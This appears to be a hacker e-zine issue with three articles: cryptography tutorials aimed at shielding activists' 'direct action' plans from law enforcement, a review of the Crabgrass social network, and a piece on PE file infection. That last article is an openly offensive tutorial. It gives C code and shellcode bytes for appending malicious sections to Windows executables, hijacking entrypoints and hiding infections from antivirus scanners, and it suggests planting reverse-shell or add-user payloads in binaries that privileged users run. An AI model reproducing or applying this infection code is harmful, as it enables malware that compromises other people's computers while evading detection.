Governemental agencies heavily rely on both wiretapping and interception of
documents. Of course these agencies also have enough expertise to break almost
every homemade code you designed (unless you have access to a very skilled
mathematician :p) but if designed properly, it will take them either a long time
(long  enough to continue with the action without them using that information
against you) or too long to be efficient and they'll leave the document and try
other ways.  

Now, this encryption should be applied to schematics, blueprints, maps and
instructional documents that are essential to operational activities and
documents that are carried by the activists. The .gov will try to pressure
activists into giving them the key, so in order to avoid this problem strict
security culture should be practiced and each document should be encrypted with
a different key, which is known only to the person responsible for the action
the document relates to.

For example, in case of animal liberation, the person responsible for terrain
recoinassance should have the key for the maps, whilst the person responsible
for the nightwatchmen's schedule should have the key to that document. Documents
should only be decrypted when needed, and the decrypted copies should be
destroyed  immediately after use, preferrably by fire, to avoid reconstruction
possibilities.

Basic knowledge in the field of cryptography and a basic mathematical
understanding are required to understand this paper, if you lack any, it isn't a
big problem, as you can read up while you read trough the paper, but it isn't
advisable to read it if maths is a weak point. Well, that being said, here we go
folks.

[0x02] Shannon Confusion and diffusion
Confusion and diffusion are two elementary properties of modern secure ciphers,
as defined by Claude Shannon. Confusion aims at making the relationship between
the statistics of a ciphertext E and it's key K as complex and involved as
possible. In the case of substitution, one could theoretically determine K based
on the statistics of E, since K is limited by the letter frequencies of E.

Let us say a cryptanalyst measures a set of statistics [S1..Sn] and tries to
determine our key [K1..Kn], for which his statistics set contains sufficient
information. Now, the aim of a good confusion method aims at making the relation
connecting these variables as complex as possible.

For example:
  F1(K1,..,Kn) = S1
  F2(K2,..,Kn) = S2
       .
       .
       .
  Fn(K1,..,Kn) = Sn

As you can see, each Fi involves all Ki (with i being the function index and the
Key index respectively). This leaves the cryptanalyst with a large number of
simultaneous equations, whereas a non-confused function would only employ a
small number of Ki.

Solving this problem with a small number of Ki is fairly trivial, one would
first evaluate some of the Ki and substitute those in the more complex
equations.

Confusion can be achieved through substitution. A method for achieving good
substitution is making use of so-called S-boxes. An S-box takes some number of
input bits, m, and transforms them into some number of output bits, n: an mxn
S-box lookup matrix. S-Boxes may be fixed but can be generated dynamically,
based  on the key, too.  

An example S-box might look like this:

     000 001 010 011 100 101 110 111
    ---------------------------------
 0 | 000 001 010 011 100 101 110 111
 1 | 111 000 001 010 011 100 101 110

Given a 4-bit input, this table produces a 3-bit output.

We first split the 4-bit input in a 3-bit and a 1-bit part (usually, a bit-
sequence is split by taking the two outerbits and the remaining innerpart, 00101
would be split in 01 ([0]010[1]) and 010 (0[010]1) for example).

Now we see where the matching column and row intersect, in this case we take
0111 as an input and split it in [011] and [1]:

     000 001 010 011 100 101 110 111
   ---------------\/----------------
 0 | 000 001 010 011 100 101 110 111
 1 > 111 000 001[010]011 100 101 110

Which gives us 010 as our output.

Now we may concatenate our output 010 with our outer byte [1] which yields 0101.
Now, reversing this process is simple, one takes the outer [1] and thus knows
in which row to look and searches that row for 010 and takes the matching column
indicator (011) and appends the outer byte which yields 0111, our input.  

Now, as you can obviously see, the examplary S-box is designed in a very poor
fashion. We must always take care when designing our S-boxes, for once they are
public (which is usually the case with most algorithms, as they are subject to
academic standards and peer-review) we must assume our opponent knows the full
design  specifics of our S-box, and the theory behind it. Ofcourse ciphers
developed for security of documents related to activist events are not to be
made public, but we don't want to rely solemnly on security trough obscurity,
for that is not only a bad practice, it is dangerous in this case, so proper
S-Box design is, logically, a topic of much debate. The answer to the question,
if there is an S-box S1 that would be preferable over another S-box S2, is yes.
For if S2 wouldn't preform any permutation, it would obviously be useless.

Another example of a poorly-designed S-box would be one based on a lineair
function, like f(x) = 5x + 10, which enables the attacker to deduct the lineair
relations based on this knowledge. For now, let us not venture too deep into
mathematical theory and assume key-dependant S-boxes are secure enough for our
short-term  purpose, or if you don't have access to computational resources
during your operation, a sufficiently random S-box should do too for a real
short-term operation, as long as you keep it's design hidden from prying eyes.

Diffusion is the property that refers to preventing statistical redudancy in the
plaintext from occurring in the ciphertext, to prevent, for example, frequency
analysis. Diffusion can be achieved trough transpositional permutation.

An example of a good transposition function is the one used in RijnDael, also
know as AES. This function works by dividing every plaintext block in a 4x4
matrix, which is transposed.

The transposition works as follows:
Let us consider a matrix A:
                               A = (41 45 46 20)
                                   (49 50 30 31)
                                   (12 43 53 70)
                                   (66 35 86 90)

Every element in each row shall be shifted x positions, cyclicly to the left,
where x is the row index number, starting indexing at 0. After one such round A
will look like this:
                                A = (41 45 46 20)
                                    (50 30 31 49)
                                    (53 70 12 43)
                                    (90 66 35 86)

The second operation mixes the columns, this is achieved by considering every
column's 4 bytes as a seperate vector and muliplying it with with a matrix over
a special finite algebraic field GF(2^8) met 2^8 elementen. This galois field
redefines addition,substraction, multiplication and division.

Addition and substraction, as in add(a,b) and sub(a,b), are defined as an
exclusive or operation. Due to the commutativity of the exclusive or operation
add(a,b) and add(b,a) are equal and add(a,b) and sub(a,b) are equal too.
Multiplication is a bit more complex. The following steps are taken in order to
multiply two values a and b:

Given two bytes a and b and a product p defined as 0, repeat the following
operations 8 times:

0) If the low bit of b = 1, p = p xor a
1) If the high bit of b = 1, h = 1, else h = 0
2) a << 1 (bitwise leftshift)
3) If h = 1, a = a xor 0x1B
4) b >> 1 (bitwise rightshift)

After these steps p will be the product of a and b as defined by multiplication
inside this galois field. Dividing a by b is achieved by multiplying a with the
multiplicative inverse of b, as in a * (1/b). Finding the multiplicative inverse
is possible by multiplying b with each value inside the galois field until we
find a value which yields a  product of 1. Another method is to employ the
extended euclidean algorithm (for those unfamiliar with it, I suggest you take a
look at it, it's essential in a lot of mathematical fields).  

Let us consider a matrix A:

    A = (2 3 1 1)
        (1 2 3 1)
        (1 1 2 3)
        (3 1 1 2)

So, in pseudocode our function works as follows:

Function MixColumn(array v[4]) // vector input
{
   array a[4] = v
   // the second parameter of gf comes from the corresponding field
   // inside the given matrix
   v[0] = gf(a[0],2) xor gf(a[3],1) xor gf(a[2],1) xor gf(a[1],3)
   v[1] = gf(a[1],2) xor gf(a[0],1) xor gf(a[3],1) xor gf(a[2],3)
   v[2] = gf(a[2],2) xor gf(a[1],1) xor gf(a[0],1) xor gf(a[3],3)
   v[3] = gf(a[3],2) xor gf(a[2],1) xor gf(a[1],1) xor gf(a[0],3)
}

The result is a mixed vector.

The inverse of the column mixing function is the same function, but with a
different matrix (the inverse matrix of the former):

    A = (14 11 13 9)
        (9 14 11 13)
        (13 9 14 11)
        (11 13 9 14)

The input of this inverse function is of course the mixed vector, combined with
this matrix. Together these two functions are RijnDael's primary methods for
achieving shannon diffusion.

[0x03]Merkle-Hellman

An example of an asymmetrical algorithm is the Merkle-Hellman cryptosystem,
based on the ""knapsack problem"", a mathematical problem in combinatorial
optimization. This problem is NP-Complete. The problem can roughly be described
as follows:  

One takes a set W so that for each x in W : [x > (n=1,i-1)(sigma)(W[n])] where i
the index position of x is.  So every number in the set must be greater than the
sum of it's predecessors, making it superincreasing. To construct the key for
encrypting a message of N bits, one takes a random number Q where Q > (n=1,N) 
(sigma)(W[n]) and a random number R so that the greatest common divisor of Q and
R is 1 (making them  coprime). Now we generate a set B = {B[1],B[1],...,B[n]}
where B[i] = (R*W[i])%Q (with % being modulo). The public key will be B and the
private key S will be a combination of W,Q and R. Encrypting a message A of
n-bits will go as follows:  

C = (n=1,i)(sigma)(A[i]B[i])

Decryption goes like this:
One calculates C' = (C*S) % Q and W = (B*S) % Q.

No we deduce the plaintext from C':

1. One takes the biggest element from W (W[max]).
2. W[i] = W[max] (W[max] is always the last element in the set)
3. If W[i] < C' or W[i] = C' then W[i] is in the knapsack.
4. If W[i] is in the knapsack, one deduces this value from C' and reduces i by
one and repeats steps 3 and 4 until every element has been tested.

And so we deduce a plaintext set from C'.
The algorithm, however, has been broken by Adi Shamir. It turned out that if the
elements of the public key are modular multiples of a superincreasing sequence,
almost all equations of the form:

(i=1,n)(sigma)x[i]*a[i] = b with x[i] in the domain {0,1}

Can be solved in polynomial time. And thus the plaintexts x[i] corresponding to
the ciphertext b can be easily found. Now, I won't go in detail about the
working of the algorithm proposed by Shamir, as it is not within the scope of
the article, this just serves as a note that this algorithm has been broken a
long time. Which does not mean it is useless. It's extremly simple nature makes
it implementable with pen, paper and a pocket calculator, which makes it
extremely well-suited for quick, short-term direct action. Say an action group
first agrees on a personal alphabet, like an ASCII table but with custom values,
as in A=1,B=2,etc and then agrees on a different public and private key for each
direct action, the private key which is distributed at the last minute before it
is needed, in a discrete form. In the event of possible capture or the document
falling in enemy hands by  accident, it makes deniability more plausable,
especially if the key is destroyed before it is taken. Of course law-enforcement
will decrypt your message very soon, but if the operation is canceled or halted
because of  the plans falling in enemy hands, it is less likely they will
vigorously pursue decryption and thus evidence than if they obtained plaintext
information.  

[0x04]Greetz'n Shoutz

Shouts and greets go to the Nullsec folks ;), the whole of RRLF, the .aware
crew, xzziroz, PullThePlug, SmashTheStack, HackThisSite, the #dutch folks,
#vxers and #vx-lab on undernet, irc.blackhat.ru, what's left of 29A and every
true blackhat and scene lover out there, stick together guys!

Also I'd like to give my regards to the indymedia folks, the people of
infoshop.org, foodnotbombs, the antifascist action, the activists of EarthFirst!
and of course the good ol' EZLN ;)

################################################################################
 RiseUp.net's Crabgrass: Non-Corporate Social Networking            by Flatline
################################################################################

Since the Internet boom happened over 10 years ago people have been organizing,
congregating and socializing through it in ever increasing numbers. Starting
first with the horribly insecure medium of chat rooms and forums, which were
hardly a step up in security from the BBSs of old. Lately there has been an
onslaught of social networks which have blown up to become arguably some of the
biggest gathering centers for social interaction. Chief among these are MySpace,
FaceBook and the now defunct pioneer, Friendster. 

The main problem with these social networks is the fact that they offer almost
no privacy, most groups can be joined by anyone and anyone can see your profile
and anyone can see who you are friends with. Sure you can put some privacy
restrictions on your profile, but you usually have to dig pretty deep to find
those and most people will not even bother to dig that deep. Even if you do, how
many people or bands have you casu- ally added as friends without fully even
knowing who they are? Security has never been a concern for social networks and
barely even a feature; until now. 

The RiseUp.net collective, the same that brought you its ultra secure, easy to
use, email and hosting services has been working on a project implemented in the
Ruby On Rails framework called ‘Crabgrass'. Crab- grass is in RiseUp's words,
""our very own open source, not for profit, social organizing platform. Crabgrass
is designed for group and network organizing, and tailored to the needs of the
global justice movement."" This boils down to some very important points, the
first being that crabgrass is Open Source, that means that you can see all the
underlying programming behind it. So you yourself, (or a more geeky friend)
could verify that there aren't any secret FBI backdoors and that your data isn't
being sold to any corporations. Also it means that anyone can review the source
code; so any security holes will be found and fixed quicker, with- out the need
to wait for some corporate oversight committee to fix the bug. The next
important point is that Crabgrass is not for profit, so you definitely don't
have to worry about your private messages being parsed for advertising, or that
your profile information is being sold to unscrupulous corporations. 

The most important feature of Crabgrass however is it's built in security from
the start. I have been using Crabgrass for a few days now, and I have to say I
am impressed with some of the security features. The first thing that impressed
me was that you don't need any sort of email to sign up for an account, this
means that an account could never be traced back to you if you didn't want it
to, and you don't even have to set up a junk email account to do it. The next
thing I noticed was that Crabgrass uses https (that's HTTP Secure for all those
of you not in the know) by default, so your connection to the server is always
encrypted. Once you do create an account you run into my first an only problem
with security, there is a feature in crabgrass to view a list of all people that
are using the software. While this is unfortunate, I have a feeling that it will
be mitigated in later versions of the crabgrass software. Its not even that big
of a problem right now though, because clicking on someone's profile will not
give you any information by default. The main social organizing tool that
crabgrass uses is groups, unlike friends in other social networks which are
freely and loosely defined, the networks in Crabgrass are defined by groups.
Groups are private by default, which means that they cannot be found in the
list of groups and communications within them cannot be searched. You can make a
group public easily, but it is not the default which is nice. When a group is
private all its members and all of its messages are hidden from the public, even
its very existence. The only downside to this is that if you go to
we.riseup.net/<groupname> you can verify that the group exists if you don't get
a 404 error. Even in that case, you can only enumerate groups, it still doesn't
give you any information about the group. I learned later that there is no real
way to get around this problem because even if you had it return a standard page
for all groups existing or not, you could enumerate groups by trying to create a
group with that name. Another security feature of groups is that you can not
automatically join a group, all group joins must be approved by the creator of
the group. So you will never get a member you don't want, even in public groups! 

Crabgrass offers some really neat features to help a group of people working on
an activist project together organize and distribute information in a secure and
efficient way. It offers tools such as group based to do lists. Personal to do
lists. Group chat rooms, discussions, private messages and wiki pages. It also
offers the ability to make completely separate public and private profiles,
although the profile code is not done yet, so I could not review that at this
time. 

I spent a little time talking to one of the developers of Crabgrass and he
informed me that there is no super user in Crabgrass, this is a pretty neat
feature, this means that if someone's account was ever compromised, the attacker
would only be able to affect that account, and not affect anything outside of
that account or the groups its a part of. This is an effective way to contain
any damage. On top of all this, the crabgrass project is hosted on the robust
and super secure riseup.net servers. These people put a lot of time and thought
into making their servers as secure as possible. 

In conclusion, Crabgrass, although still in its alpha stages and full of bugs is
shaping up to be very excellent software. It is clear that the developers have
put a lot of thought and time into building a Social Network that figures in
security from the ground up, I predict that this software will develop into a
great full fledged organizing system. The revolution will not be hosted on
MySpace, but it may very well be on Crabgrass.        

################################################################################
 The PE File Format and it's Dark Side  part 2          by Nomenumbra/[0x00SEC]
################################################################################

[0x05] The Dark Side of This Information

""Well very interesting and all Nome you'll say, but how's this gonna help me
h4x?"" Well, there are several approaches we can take, I will discuss two:

 0) Backdooring PE files trough PE infection (both appending and EPO)
 1) Compressing/Encrypting your executables to make them smaller and less likely
    to be detected by AV engines.

In this article we'll discuss PE backdooring/infection, writing a crypter /
packer will be fairly easy once you've mastered the concept of manipulating PE
file modification, since you can easily use self-decrypting/unpacking code
instead of malicious code. In the context of hacking we'd have, for example, the
following scenario in mind:

Take a well known binary that is run frequently by a user with higher privileges
and add some shellcode (re- verse shell, add user, whatever) to it while still
having a fully functional original binary. In the VXing context it's pretty
clear, we'd want to append/employ EPO to infect a target file with our virus.
Since this concept has been chewed and documented over and over again in the
VXing scene, and the concept is generally the same, i'll just focus on the
general concept, not viral or hacking specific , but as I said, the theory is
generally the same, and you could just use viral code (the executing app) as
well as prefixed shellcode. 

First of all we'll discuss appending. Appending to a PE file basically comes
down to adding an extra section to the PE and making the entrypoint point to the
beginning of this section which executes our code and transfers control back to
the original entrypoint, so our code will be execute before the real application
code, without the user noticing a huge difference. 

Now, let us sum up what needs to be done to Append our code to a PE file.

  [0] Create a new section header for our malicious section
  [1] Create a new section with our malicious code
  [2] Update PE image details relevant to section count,size,etc
  [3] Change the PE entry point
  [4] (OPTIONAL) Mark the file as infected (in case of a viral infection, to
      avoid double infections)

Now, you might wonder how we allocate space for that extra section header?
Simple .. we don't, there is always space for at least one extra section header
in the PE file format. So let's get our hands dirty . First we must create a new
section header, which should be located directly after the last section header
in the original image. So let's locate the last section header.

 IMAGE_SECTION_HEADER* sectiontable=(IMAGE_SECTION_HEADER *)&szBuffer[iDosHeader
->e_lfanew+0x18+iFileHead->SizeOfOptionalHeader]; // section table

Note that 0x18 is the size of IMAGE_FILE_HEADER (0x14) + 0x4 (IMAGE_NT_HEADERS
signature dword). So now sectiontable is an array of pointers to section tables.
Accessing the last section header is fairly
simple:

 IMAGE_SECTION_HEADER* lastsection=&sectiontable[iFileHead->NumberOfSections-1];
                 // last section

Why sectioncount-1? Simple, because if there are 2 sections, our last one will
be element 1 in the array (arrays start at 0 remember ;)

So our new section will have to be located here:
IMAGE_SECTION_HEADER* newsection=&sectiontable[iFileHead->NumberOfSections++];
     // our new section

The ++ auto-increments the number of sections, updating the PE image accordingly
Let's set up our new section:
strcpy((char *)&newsection->Name,"".nomenumbra""); // new section's name

As said earlier, section data, like size, offsets and RVAs need to be aligned
according to PE details. A simple macro for aligning values is this:

 #define ALIGN(X,Y) ((X+(Y-1))&(~(Y-1))) which will align value X according to
value Y newsection->VirtualAddress=ALIGN(lastsection->
misc.VirtualSize+lastsection->VirtualAddress,iOptHead->SectionAlignment);
                    // align new rva
 newsection->PointerToRawData=ALIGN(lastsection->SizeOfRawData+lastsection->
PointerToRawData,iOptHead->FileAlignment); // align new physical offset
 newsection->Misc.VirtualSize=ALIGN(shellcode_size,iOptHead->SectionAlignment);
           // align new virtual size
 newsection->SizeOfRawData=ALIGN(shellcode_size,iOptHead->FileAlignment);  
          // align new physical size
 newsection->Characteristics=IMAGE_SCN_CNT_CODE|IMAGE_SCN_MEM_EXECUTE|
IMAGE_SCN_MEM_READ|IMAGE_SCN_MEM_WRITE;               // section flags hurray!

Now we Adjusted the new section fields, let us update the PE image and write our
malicious code to the new section:

 iOptHead->SizeOfCode+=newsection->misc.VirtualSize; // new code size
 iOptHead->SizeOfImage=newsection->VirtualAddress+newsection->Misc.VirtualSize;
                // new image size
                //important to adjust this value since the EOF will be set here!
 FileSize = newsection->PointerToRawData+newsection->SizeOfRawData;
                // physical offset + physical size (EOF)
 CreateJumper(scode,iOptHead->ImageBase+iOptHead->AddressOfEntryPoint);
 iOptHead->AddressOfEntryPoint=newsection->VirtualAddress;
                // update the entrypoint to make it point to our code                                                                              // point into our code
 for(i = 0; i < shellcode_size; i++)
   szBuffer[newsection->PointerToRawData+i] = scode[i];
                // write our malicious code to the new data (that's why we
                // mapped the file with size + shellcode_size, to avoid b0fs)

This is basically all the code that is necessary to add an extra section and
make code execution start there. This leaves us with one more subject, the
CreateJumper function. This function will adjust our malicious code to transfer
control back to the original entrypoint after it's done executing. Say we'd
original have a piece of code that does nothing else than jump to the original
entrypoint: 

unsigned char scode[7];
memset(scode,0,7);
strcpy(scode,""\xBF\xEF\xBE\xAD\xDE\""                // mov edi,0xDEADBEEF
          ""xFF\xE7""                                 // jmp edi
     );
int shellcode_size = sizeof(scode);
#define ENTY_POINT_OFFSET 1
void CreateJumper(unsigned char* scode,DWORD EntryPoint)
{
  *(DWORD*)(scode+ENTY_POINT_OFFSET) = EntryPoint;
}

The CreateJumper function will modify the DWORD at scode+1 (the beginning of the
little endian 0xDEAD- BEEF) to be the original entrypoint of the PE image. This
piece of code will move that address into edi and then jump there. Just prepend
whatever malicious code you want to this jump and update the ENTRY_POINT_OFF-SET
accordingly to have it work. Do note however that your malicious code may make
no direct address references, but needs to either do a delta offset adjustment,
like all PE Appending viruses do (just read lord Julus' tutorial in the resource
list) or use use the call/jmp/pop trick like shellcode usually does, then all
will be fine. 

Now let us look at the downsides of PE Appending. First of all it's fairly
obvious when a PE file's entrypoint points outside the usual code section. Most
debuggers will immediately alert the reverser of a potentially self-modifying/
packed or infected PE file. Also anti-viral heuristics might report the file
(when there are some other factors present as well, like an incorrect checksum,
which usually indicates an infection mark, to prevent double-infection) as being
infected. To counter these downsides, EPO was invented. EntryPoint Obfuscation/
Obscuration (EPO) is a technique that will leave the entrypoint intact but still
make the malicious code execute first. 

How can we do this? Well the most basic method would be the one employed by the
old Cabanas virus, we take the first 7 bytes at the original entrypoint and
overwrite them with a jump to our new section (or we could simply extend the
original code section and include our code there, which is fairly trivial when
adapting the above code a bit). 

Let us look at the following example:

Before modification:
{ENTRY_POINT@.text}
00401000 >/$ 6A 00       PUSH 0               
                                        ; /Style = MB_OK|MB_APPLMODAL
00401002 |. 68 00204000  PUSH calc.00402000   
                                        ; |Title = ""shitcrypt v1.0 test 1 2 3 4""
00401007 |. 68 00204000  PUSH calc.00402000   
                                        ; |Text = ""shitcrypt v1.0 test 1 2 3 4""
0040100C |. 6A 00        PUSH 0               
                                        ; |hOwner = NULL
0040100E |. E8 40000000  CALL <JMP.&USER32.MessageBoxA> 
                                        ; \MessageBoxA

After modification:

{ENTRY_POINT@.text}
00401000 > $ BF 00504000   MOV EDI,calc.00405000
                                        ; New section with our code
00401005 ? FFE7            JMP EDI
00401007 . 68 00204000     PUSH calc.00402000 
                                        ; |Text = ""shitcrypt v1.0 test 1 2 3 4""
0040100C . 6A 00           PUSH 0           
                                        ; |hOwner = NULL
0040100E . E8 40000000     CALL <JMP.&USER32.MessageBoxA> 
                                        ; \MessageBoxA

What is important is that at the end of our malicious code there should be a
reset of the original 7 bytes at the entrypoint and then a jump back to the
entrypoint. The following code would accomplish that:

 mov edi,0DEADBEEFh
               ; 0xDEADBEEF will be modified into the entrypoint address
 mov eax,0CAFEBABEh
               ; eax is the first 4 bytes of the original code at the entrypoint
 stosd         ; store them
 xor eax,eax
 mov ax,0DEADh ; next 2 bytes of the original code
 stosw
 xor eax,eax
 mov al,0Ah    ; last byte of the original code
 stosb
 sub edi,7     ; substract 7 from edi and jump there, edi is now the entrypoint
                 address again.
 jmp edi

In shellcode form it would look like this:

unsigned char scode[29];
  memset(scode,0,29);
  strcpy(scode,
           ""\xBF\xEF\xBE\xAD\xDE""        // mov edi,entrypoint
           ""\xB8\xBE\xBA\xFE\xCA""        // mov eax,original dword @ entrypoint
           ""\xAB""                        // stosd
           ""\x33\xC0""                    // xor eax,eax
           ""\x66\xB8\xAD\xDE""            // mov ax,orignal word @ entrypoint + 4
           ""\x66\xAB""                    // stosw
           ""\x33\xC0""                    // xor eax,eax
           ""\xB0\x0A""                    // mov al,orignal byte @ entrypoint + 6
           ""\xAA""                        // stosb
           ""\x83\xEF\x07""                // sub edi,7 (edi == entrypoint again)
           ""\xFF\xE7""                    // jmp edi);

Now we should modify the values (entrypoint, original bytes) at the according
offsets and write this piece of code to the new section, of course we should
first prepend our real malicious code to this restoration code. Also note that
the section flags of the code section should have the addition of being
writeable (do a logical or on them with IMAGE_SCN_MEM_WRITE) in order to allow
code restoration. 

Now this method is quite OK, but most AV scanners will still pick this up by
checking for a suspicious jump outside of the current section at the entrypoint.
GriYo's Marburg virus added random junk code before the jump to another section,
but newer AV emulators can trace trough it, so we need to find another method
for true, stealthy EPO. 

In his article ""EPO: Entrypoint Obscuring"" GriYo introduced a method of scanning
the target code section for API calls and inserting an EPO jump after them. This
method involved looking for the FF15 opcode (call <addr> opcode) check if the
<addr> lied within our code section (by checking if the rva (<addr> - imagebase)
lied between the code section VirtualAddress and VirtualAddress+VirtualSize, if
so it would overwrite the instruc- tion after the call with a call to our viral
code, where our viral code would simply pop the retaddr of the original
instruction so it could set everything back again. The benefit of this method
was that AV scanners would first spot a call inside the code section and not
mark the file as employing EPO. The mayor downside was that if the first
suitable infection spot lied after a conditional branch there might have been a
chance that the virus wouldn't get executed at all. He improved this as he
discussed in detail in his article ""EPO: Entrypoint Obscuring"". 

Now, although this method proved quite efficient Piotr Bania raised some
important questions in his article ""Fighting EPO viruses"". Quoting him:

    ""As mentioned before, the virus injects the call instruction by overwriting
    it with a randomly found call. As the application size grows (and also the
    injected call range from the entry-point), it becomes increasingly difficult
    to find the injection of the virus. On the other hand, while using this EPO
    technique reduces the risk of virus execution, there are also some cases
    when the ""call-to-virus"" will not be executed at all."" 

At this point, let's find a way to detect such injections such that it does not
cause false alarms. How difficult is it to find CTX.Phage injections? First of
all, the virus inserts a call instruction as follows:

E8 ?? ?? ?? ?? CALL XXXXXXXX

Where:
E8 is the CALL instruction opcode, ?? ?? ?? ?? is the instruction operands
(destination)
Before we go any further, let's summarize all the information we know about the
current EPO:

The injection is always done somewhere behind the entry-point.
The injected call executes the virus code which is stored always in last section
(this bit of information is re- ally helpful). As the reader probably knows, we
could simply search for 0xE8 bytes (call opcodes) but there is large possibility
that we might find some ""suspicious"" call that thands in non-call instruction,
for example: 68 332211E8 PUSH E8112233 

As you can see, this is the push instruction, but the scanner finds the E8 byte
and could consider it as a call. Unless we don't want to build up our 
disassembler engine (which is very long and hard work) we need to find another
way. Yes, you guessed it: we need to add a condition for the E8 byte scanning
routine, remembering that the call always executes code that resides in last
section! Now that everything is clear, here are the conditions we require:

temp_loc = (DWORD)((DWORD)pSHC->VirtualAddress + i + (*(DWORD*)loc)) + 5;
if (temp_loc >= pSH->VirtualAddress && temp_loc <= pSH->VirtualAddress +
  pSH->Misc.VirtualSize) BAD_CALL = 1;

Where:
temp_loc is the calculated destination of found call (E8 opcode)
pSH is the header of last section
+ 5 is the size of call instruction (opcode + destination)
A sample temp_loc calculation might look as follows:

Scanned instruction:
00401025 \. E8 58270000 CALL <jmp. &kernel32.exitprocess="""">
Calculation: temp_loc = 1025 (virtual address) + 00002758 (call destination) + 5
  (size of call instruction)

If the temp_loc address resides somewhere between last section's virtual address
(start) and the last section's virtual address + its virtual size, the call is
marked as suspicious."" This method works like a charm indeed, hence why many
heuristics scanners employ this method. There is however one crucial weakness in
this method:

""The injected call executes the virus code which is stored always in last
section (this bit of information is really helpful).""

It relies on the fact that the EPO jump is considered to always jump to an
appended section. So what if it didn't? Hmm interesting. We have to make a
choice as in what is the most important goal we want to achieve. ""Full"" stealth,
or making sure the host app code execution flow doesn't get corrupted in ANY
way.

If we choose the first or second, we might do the following:
Scan host code for a jump/call inside the host code, see where it references to
and at this point insert a jump/call to our viral code stored in, for example,
an extra section.

However there is one BIG downside (apart from the same improbability of viral
execution as with GriYo's method) in this case, check the following example:

{ENTRYPOINT@HOSTECODE}
   <some code>
   test eax,eax
[0] call Label1
   <who cares>
Label1:
[1] mov ebx,0xCAFEBABE
   jz roflmao
   <some more code>
 roflmao:
   <yet some other code>

When we would follow our method, we would encounter the call at [0] and insert
our jump/call to the viral code at [1]. Now the problem lies in the fact that
after the test eax,eax before [0], the zero flag is set, code execution
continues from [1] to our viral code and potentially the zero flag gets messed
up, rendering differ- ent results at the jz after [1]. We can't possibly take
all this into account so we'll have to find another, reliable, stealthy method
without interfering with code execution flow.

To do this, I thought up a way i'd like to call ""Codeswap infection"":
 [0] Find section the entrypoint is located in
 [1] Check if there is enough space in this section for our malicious code +
     jump to restoration routine
 [2] Generate a random address inside this section, leaving us enough space to
     store our mal. code + jump
 [3] Create a new section of size = sizeof(malcode)+sizeof(jump)+
     sizeof(restorationcode)
 [4] Backup X bytes from the address in the host code we are gonna store our
     mal. code and write these X bytes to the new section. X is the size of the
     mal. code + jump
 [5] Write our mal. code to that address
 [6] Create a jump to address (RVA of new section+sizeof(malcode)+sizeof(jump)),
     this address is right after our backed up original code
 [7] Append this jump to the mal. code in the host code body
 [8] Create the restoration routine and write it to the address generated in [6]
 [9] Point the PE entrypoint to the address in the host code we wrote our mal.
     code to

Our restoration code should look like:
  mov edi,0DEADBEEFh ; malicious code address
  mov esi,0CAFEBABEh ; new section RVA+imagebase
  mov ecx,0D3F4C3D1h ; section length
looplen:
  lodsb
  stosb
loop looplen
  mov edi,0DEADFED2h ; PE entrypoint
  jmp edi

I will now provide some sample code in C which should be easily portable to ASM
for anyone with at least some experience in PE manipulation and a decent
understanding of ASM. The reason I choose to write this code in C is that the
whole concept will be a lot clearer this way and to help people who are not that
familiar with everyday ASM usage:

#define MAL_OFFSET 1
#define ORG_OFFSET 6
#define LEN_OFFSET 11
#define ENT_OFFSET 20

void CreateRestorationCode(unsigned char* scode,DWORD malcode,DWORD newsect,
DWORD restorelen,DWORD entry)
{
  *(DWORD*)(scode+MAL_OFFSET) = malcode;
  *(DWORD*)(scode+ORG_OFFSET) = newsect;
  *(DWORD*)(scode+LEN_OFFSET) = restorelen;
  *(DWORD*)(scode+ENT_OFFSET) = entry;
}

<snip>
         //scode is our malicious code
unsigned char jmpcode[7];
         // A piece of jump code, a jump to the next shatter piece that will be
         // inserted after each shatterpiece, the jump after the last
         // shatterpiece will jump to the restoration code.

memset(jmpcode,0,7);
strcpy(jmpcode,""\xBF\xEF\xBE\xAD\xDE\xFF\xE7"");
unsigned char restorecode[26];
memset(restorecode,0,26);
strcpy(restorecode,""\xBF\xEF\xBE\xAD\xDE""  // mov edi,<addr of malicious code>
             ""\xBE\xBE\xBA\xFE\xCA""        // mov esi,<addr of original code>
             ""\xB9\xD1\xC3\xF4\xD3""        // mov ecx,<length of malicious code>
             //<looplabel:>
             ""\xAC"" // lodsb
             ""\xAA"" // stosb
             ""\xE2\xFC"" //loop <looplabel>
             ""\xBF\xD2\xFE\xAD\xDE"" // mov edi,<entrypoint address>
             ""\xFF\xE7""); // jmp edi

int shellcode_size = sizeof(scode)+sizeof(jmpcode)+sizeof(restorecode);
IMAGE_SECTION_HEADER* sectiontable=(IMAGE_SECTION_HEADER *)&szBuffer[iDosHeader
 ->e_lfanew+0x18+iFileHeader->SizeOfOptionalHeader];          // section table
IMAGE_SECTION_HEADER* lastsection=&sectiontable[iFileHead->NumberOfSections-1];
                    // last section
int entrysection_id = 0;
for(i = 0; i < iFileHead->NumberOfSections;i++)
{
  if((iOptHead->AddressOfEntryPoint >= sectiontable[i].VirtualAddress) &&
    (iOptHead->AddressOfEntryPoint <= sectiontable[i].VirtualAddress+
    sectiontable[i].Misc.VirtualSize))
  {
    // entrypoint section id
    entrysection_id = i;
    break;
  }
}
if (sectiontable[entrysection_id].oe_physsize < (sizeof(scode)+sizeof(jmpcode)))
{
  // quit code here and reset everything!
}

DWORD TargetRawAddr = rand()%(sectiontable[entrysection_id].SizeOfRawData-
  (sizeof(scode)+sizeof(jmpcode))) + sectiontable[entrysection_id].
  PointerToRawData;      
// Generate a random address in the code section where our viral code will fit
DWORD delta = (TargetRawAddr - sectiontable[entrysection_id].PointerToRawData);
DWORD TargetRVA = sectiontable[entrysection_id].VirtualAddress + delta;
// virtualrva + physical delta
printf(""[+]Inserting viral code at RVA %#x == Raw addr %#x...\n"",TargetRVA,
TargetRawAddr);
newsection=&sectiontable[iFileHead->NumberOfSections++];     // our new section
strcpy((char *)&newsection->Name,SectName); // new section's name
newsection->VirtualAddress=ALIGN(lastsection->Misc.VirtualSize+lastsection>
  VirtualAddress,iOptHead->SectionAlignment);                // align new rva
newsection->PointerToRawData=ALIGN(lastsection->SizeOfRawData+lastsection
  ->PointerToRawData,iOptHead->FileAlignment);
                                       // align new physical offset
newsection->Misc.VirtualSize=ALIGN(shellcode_size,iOptHead->SectionAlignment);
                                       // align new virtual size
newsection->SizeOfRawData=ALIGN(shellcode_size,iOptHead->FileAlignment);
                                       // align new physical size
newsection->Characteristics=IMAGE_SCN_CNT_CODE|IMAGE_SCN_MEM_EXECUTE|IMAGE_SCN_
  MEM_READ;                            // set new section flags so we can edit
printf(""[+]Created new section...\n"");
iOptHead->SizeOfCode+=newsection->Misc.VirtualSize;       // new code size
